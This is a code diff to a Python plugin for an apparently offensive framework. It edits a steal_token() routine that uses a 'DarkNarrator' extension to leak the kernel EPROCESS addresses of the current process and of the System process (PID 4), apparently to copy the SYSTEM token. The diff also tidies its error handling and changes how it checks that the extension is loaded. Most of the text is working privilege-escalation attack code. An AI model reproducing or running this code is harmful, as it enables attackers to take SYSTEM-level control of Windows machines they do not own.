@@ -51,18 +51,19 @@ def steal_token():
     current_pid = int(eh.ui.GetEnv("CLSP_PROCESS_ID"))
     hcurrentproc = api.GetProcessHandle(current_pid, const.PROCESS_ALL_ACCESS)
     if not hcurrentproc:
-        eh.ui.Echo("Failed to get handle to current process", eh.ECHO_ERROR)
+        eh.ui.Echo(f"Failed to get handle to current process ({eh.ui.GetLastError()})", eh.ECHO_ERROR)
         return
     
     current_eprocess = extapi.InvokeUserExtensionApi(dana.DANA_LEAK_KERNEL_OB, hcurrentproc, current_pid)
+    api.CloseHandle(hcurrentproc)
     if not current_eprocess:
-        eh.ui.Echo("Failed to leak current EPROCESS", eh.ECHO_ERROR)
+        eh.ui.Echo(f"Failed to leak current EPROCESS ({eh.ui.GetLastError()})", eh.ECHO_ERROR)
         return
     eh.ui.Echo(f"Current EPROCESS kernel address: {hex(current_eprocess)}", eh.ECHO_DEFAULT)
 
     target_eprocess = extapi.InvokeUserExtensionApi(dana.DANA_LEAK_KERNEL_OB, 0x4, 4)
     if not target_eprocess:
-        eh.ui.Echo("Failed to leak System EPROCESS", eh.ECHO_ERROR)
+        eh.ui.Echo(f"Failed to leak System EPROCESS ({eh.ui.GetLastError()})", eh.ECHO_ERROR)
         return
     eh.ui.Echo(f"System EPROCESS kernel address: {hex(target_eprocess)}", eh.ECHO_DEFAULT)
 
@@ -76,17 +77,12 @@ def steal_token():
 
 
 def main(args):
-    dana_available = False
-    if not args.query_priv and not args.enable_priv and not args.disable_priv and not args.dana_steal_token:
+    if not args.query_priv and not args.enable_priv and not args.disable_priv and not args.steal_token:
         eh.ui.Echo("No arguments provided. Use .help", eh.ECHO_ERROR)
         return
 
-    if eh.ui.GetEnv("DANA_REGISTERED") == 'true' and int(eh.ui.GetEnv("DANA_LAYER_UID")) > 16:
-        eh.ui.Echo("Active DarkNarrator extension detected", eh.ECHO_WARNING)
-        dana_available = True
-
-    if args.dana_steal_token:
-        if dana_available:
+    if args.steal_token:
+        if dana.DANA_IsReady():
             return steal_token()
         else:
             eh.ui.Echo("Cannot steal token, DarkNarrator not loaded!", eh.ECHO_ERROR)
